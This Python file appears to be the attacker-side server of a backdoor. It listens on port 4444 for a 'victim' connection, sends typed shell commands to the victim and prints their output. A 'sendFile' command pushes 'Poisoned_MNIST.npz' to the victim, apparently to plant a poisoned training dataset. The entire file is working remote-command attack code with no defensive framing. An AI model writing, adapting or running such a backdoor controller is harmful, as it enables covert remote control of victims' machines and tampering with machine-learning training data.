from asyncio.windows_events import NULL
import socket
import os

filename = "Poisoned_MNIST.npz"
BUFFER_SIZE = 4096 # send 4096 bytes each time step

h_name = socket.gethostname()
my_ip = socket.gethostbyname(h_name)
port = 4444

server = socket.socket()
server.bind((my_ip, port))
print('[+] Server Started')
print('[+] Listening For Victim')

server.listen(1)
victim, victim_addr = server.accept()
print(f'[+] {victim_addr} Victim opened the backdoor')


while True:
    command = input('Enter Command : ')
    if (command != "sendFile"):
        command = command.encode()
        victim.send(command)
        print('[+] Command sent')
        output = victim.recv(1024)
        output = output.decode()
        print(f"Output: {output}")
    else:
        command = command.encode()
        victim.send(command)
        print('[+] Command sent')

        with open(filename, "rb") as f:
            # read the bytes from the file
            bytes_read = f.read(BUFFER_SIZE)
            while bytes_read:
                # we use sendall to assure transimission in 
                # busy networks
                victim.sendall(bytes_read)
                bytes_read = f.read(BUFFER_SIZE)
            msg = b'\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff'
            victim.sendall(msg)
            print(msg)

        print("file transmitting is done")
        output = victim.recv(1024)
        output = output.decode()
        print(f"Output: {output}")